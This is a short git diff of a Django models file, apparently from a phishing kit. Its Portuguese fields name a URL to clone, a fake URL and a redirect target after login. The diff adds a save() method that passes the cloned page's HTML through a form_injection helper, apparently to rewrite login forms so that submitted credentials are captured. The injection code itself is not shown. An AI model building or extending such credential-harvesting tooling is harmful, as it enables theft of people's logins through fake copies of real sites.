@@ -1,5 +1,5 @@
 from django.db import models
-
+from .utils import form_injection
 
 
 # Create your models here.
@@ -16,7 +16,13 @@ class TemplateCopy(models.Model):
     redirect = models.CharField(verbose_name='Para onde redirecionar após login', max_length=500, blank=True, null=True, help_text='Se deixar vazio, irá redirecionar para a própria tela de login')
 
     def __str__(self):
-        return f"{self.title} - {self.url_clonar} - {self.url_fake}"
+        return f"{self.title} - {self.url_clonar_base} - {self.url_fake}"
+    
+    def save(self, *args, **kwargs):
+        print('salvei')
+        html_new = form_injection(self.content, self.url_clonar_base)
+        self.content = html_new
+        return super().save()
 
 
 class Account(models.Model):
